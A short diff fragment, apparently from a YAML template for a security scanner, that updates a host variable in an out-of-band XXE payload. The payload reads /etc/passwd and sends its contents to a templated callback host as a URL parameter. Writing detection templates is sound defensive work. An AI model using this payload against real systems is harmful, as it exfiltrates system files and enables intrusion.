@@ -9,7 +9,7 @@ data:
     Content-Type: text/xml
   body: |-
     <!ENTITY % payl SYSTEM "file:///etc/passwd">
-    <!ENTITY % int "<!ENTITY % trick SYSTEM 'http://{{ .Host }}:80/{{ .NotifyString }}/xxe?p=%payl;'>">
+    <!ENTITY % int "<!ENTITY % trick SYSTEM 'http://{{.Request.Host}}:80/{{ .NotifyString }}/xxe?p=%payl;'>">
 
 ---
 
